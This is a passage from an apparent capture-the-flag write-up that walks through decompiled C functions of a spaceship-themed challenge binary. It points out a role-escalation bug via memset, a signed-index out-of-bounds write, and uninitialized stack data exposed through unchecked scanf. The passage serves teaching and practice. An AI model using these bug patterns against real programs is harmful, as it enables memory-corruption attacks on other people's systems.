+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">5u</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">change_role</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">default</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">log_message</span><span class="p">(</span><span class="mi">3LL</span><span class="p">,</span> <span class="s">&#34;Invalid option</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s check the <code>print_current_role</code> function</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">print_current_role</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// eax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v0</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">curr_user</span> <span class="o">+</span> <span class="mi">64</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v0</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">log_message</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">&#34;Current Role: Crew</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v0</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">LABEL_9</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v0</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">log_message</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">&#34;Current Role: Captain</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v0</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LABEL_9</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log_message</span><span class="p">(</span><span class="mi">3LL</span><span class="p">,</span> <span class="s">&#34;How did you get here?!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">1337</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">log_message</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">&#34;Current Role: Technician</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Turn out, the <code>curr_user+0x100</code> is a <code>role</code>. Based on that code, there are three role, <code>crew</code> (<code>2</code>), <code>captain</code> (<code>0</code>), and <code>technician</code> (<code>1</code>). Using the bug before in the <code>user_edit</code> where the <code>role</code> got nullified by the <code>memset</code>, that means we can set our role directly to <code>captain</code>.</p>
+<p>Now, let&rsquo;s try to disas each menu that is available.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">configure_engine</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rcx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rdx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">num</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-24h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-20h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="c1">// [rsp+25h] [rbp-Bh] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+27h] [rbp-9h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v8</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">curr_user</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Engine number [0-%d]: &#34;</span><span class="p">,</span> <span class="mi">3LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">num</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">num</span> <span class="o">&lt;=</span> <span class="mi">3</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Engine [%d]: </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">num</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">Thrust: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%ld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">Mixture ratio: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%ld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Do you want to save the configuration? (y/n) &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">[</span><span class="n">strcspn</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#34;y&#34;</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v0</span> <span class="o">=</span> <span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">engines</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">*</span> <span class="n">num</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v1</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="n">v0</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v0</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">log_message</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="s">&#34;Engine configuration updated successfully!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">log_message</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">&#34;Engine configuration cancelled.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log_message</span><span class="p">(</span><span class="mi">3LL</span><span class="p">,</span> <span class="s">&#34;Only technicians are allowed to configure the engines&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This menu can only be accessed if the role is <code>technician</code>. Notice that there is a bug where the <code>num</code> that stored the targeted index is a signed int. That means, we can put negative value, which will give us a OOB write for address before the <code>engines</code>.</p>
+<p>The function <code>check_engines</code> isn&rsquo;t useful enough, so I&rsquo;ll skip it. Next function will be the <code>change_route</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">change_route</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-54h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v2</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-50h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="c1">// [rsp+55h] [rbp-Bh] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+57h] [rbp-9h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+58h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">curr_user</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log_message</span><span class="p">(</span><span class="mi">3LL</span><span class="p">,</span> <span class="s">&#34;Only the captain is allowed to change the ship&#39;s route</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">3</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;&lt;===[ Coordinates [%d] ]===&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">Latitude  : &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%ld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v2</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">Longitude : &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%ld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v2</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Do you want to save the route? (y/n) &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">[</span><span class="n">strcspn</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#34;y&#34;</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">route</span> <span class="o">=</span> <span class="n">v2</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">      <span class="n">qword_405168</span> <span class="o">=</span> <span class="n">v2</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">      <span class="n">qword_405170</span> <span class="o">=</span> <span class="n">v2</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">      <span class="n">qword_405178</span> <span class="o">=</span> <span class="n">v2</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">      <span class="n">qword_405180</span> <span class="o">=</span> <span class="n">v2</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">      <span class="n">qword_405188</span> <span class="o">=</span> <span class="n">v2</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">      <span class="n">qword_405190</span> <span class="o">=</span> <span class="n">v2</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">      <span class="n">qword_405198</span> <span class="o">=</span> <span class="n">v2</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">      <span class="n">log_message</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="s">&#34;The route has been successfully updated!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">log_message</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">&#34;Operation cancelled&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This menu can only be used if your role is <code>captain</code>. Notice that there is two bug in this method. The first one is how it scan the value. If we put invalid number during the call of <code>__isoc99_scanf(&quot;%ld&quot;, &amp;v2[2 * i]);</code> and <code>__isoc99_scanf(&quot;%ld&quot;, &amp;v2[2 * i + 1]);</code> (For example, putting an alphabet cahracter), the scanf will skip and continue to the next LOCs. The second bug is that there isn&rsquo;t any handling mechanism to handle if the <code>scanf</code> is failed, which means it will still copy the value stored in the stack to the <code>route</code> variable.</p>
+<p>This kind of bug is called UDA (Uninitialied Data Access). If you read the code again, there isn&rsquo;t any mechanism to clear out the stack data before using it. Combined with the fact that there isn&rsquo;t failure handling if the <code>scanf</code> failed, that means it is possible for us to set the <code>route</code> value with the value from the stack. If we&rsquo;re lucky enough, that might contains some sensitive data that shouldn&rsquo;t be leaked (for example, a libc address).</p>
+<p>Let&rsquo;s check the <code>view_route</code> menu.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">view_route</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">curr_user</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">log_message</span><span class="p">(</span><span class="mi">3LL</span><span class="p">,</span> <span class="s">&#34;Only the captain is allowed to view the ship&#39;s route.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;&lt;===[ Route ]===&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">3</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">print_coordinates</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This method is just printing values stored in the <code>route</code> array. Let&rsquo;s check the last menu called <code>change_role</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">change_role</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">num</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">curr_user</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">log_message</span><span class="p">(</span><span class="mi">3LL</span><span class="p">,</span> <span class="s">&#34;Only Captain is allowed to change roles.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;&lt;===[ Available roles ]===&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Technician: 1 | Crew: 2&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;New role: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">num</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
